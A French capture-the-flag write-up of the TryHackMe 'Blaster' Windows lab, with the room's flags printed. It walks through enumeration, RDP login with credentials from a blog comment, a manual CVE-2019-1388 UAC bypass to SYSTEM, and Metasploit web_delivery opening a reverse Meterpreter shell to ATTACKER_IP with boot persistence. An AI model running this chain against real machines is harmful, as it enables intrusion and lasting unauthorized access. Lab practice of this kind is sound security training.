# Blaster — TryHackMe

**Difficulté :** Easy | **OS :** Windows | **Thème :** Enum web → RDP → UAC bypass → Meterpreter persistence

---

## Task 1 — Mission Start!

Séquelle de la room Ice. Approche sans Metasploit pour l'exploitation initiale, Metasploit réintroduit uniquement en Task 4 pour la persistence.

---

## Task 2 — Activate Forward Scanners and Launch Proton Torpedoes

### Enumération nmap

```bash
nmap -sV <TARGET_IP>
```

|Port|Service|
|---|---|
|80|HTTP — Microsoft IIS 10.0|
|3389|RDP — Microsoft Terminal Services|

> Avec `-p-` on trouve aussi le port 5985 (WinRM), mais la réponse attendue est **2 ports**.

### Enumération web

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

- Répertoire trouvé : `/retro` → blog WordPress
- Auteur des posts : **Wade** → username potentiel
- Post "Ready Player One" → commentaire de Wade contenant : **parzival** → mot de passe

### Accès RDP

```bash
xfreerdp /u:wade /p:parzival /v:<TARGET_IP> /dynamic-resolution
```

- `user.txt` sur le bureau : `THM{HACK_PLAYER_ONE}`

---

## Task 3 — Breaching the Control Room

### CVE-2019-1388

**Vuln :** Elevation of Privilege dans le dialogue de certificat Windows (UAC bypass). **Fichier :** `hhupd.exe` — trouvé dans la Corbeille (non supprimé par l'utilisateur).

### Exploit — étapes manuelles

1. Restaurer `hhupd.exe` depuis la Corbeille vers le Bureau
2. Clic droit → **Exécuter en tant qu'administrateur** → invite UAC
3. Cliquer **Show more details** → **Show information about the publisher's certificate**
4. Dans la fenêtre de certificat, cliquer sur le lien **VeriSign Commercial Software Publishers CA**
5. Internet Explorer s'ouvre en tant que `NT AUTHORITY\SYSTEM`
6. IE → **Fichier → Enregistrer sous** → dans la barre de chemin, taper `C:\Windows\System32\cmd.exe` → **Ouvrir**
7. Un `cmd.exe` s'ouvre avec les droits SYSTEM

```
whoami → nt authority\system
```

- `root.txt` sur le bureau Administrator : `THM{COIN_OPERATED_EXPLOITATION}`

---

## Task 4 — Persistence

### Web Delivery (bypass Windows Defender)

```bash
msfconsole
use exploit/multi/script/web_delivery
show targets          # repérer PSH (PowerShell)
set target 2          # target PSH
set payload windows/meterpreter/reverse_http
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run -j
```

Metasploit génère une commande PowerShell → la coller dans le terminal SYSTEM obtenu via CVE-2019-1388.

> Astuce : héberger la commande via `python3 -m http.server` si le copier-coller entre machines ne fonctionne pas.

### Récupérer la session

```bash
sessions
sessions -i 1
getuid        # → NT AUTHORITY\SYSTEM
```

### Persistence au démarrage

```bash
run persistence -X
```

`-X` = démarrage automatique au boot. Nécessite ensuite un listener `exploit/multi/handler` côté attaquant pour recevoir la reconnexion.

---

## Résumé de la chaîne d'attaque

```
nmap → gobuster → /retro (WordPress)
→ username: wade / password: parzival (commentaire blog)
→ RDP → user.txt
→ hhupd.exe (Corbeille) + CVE-2019-1388 → UAC bypass → SYSTEM
→ root.txt
→ Metasploit web_delivery → Meterpreter SYSTEM
→ persistence -X
```

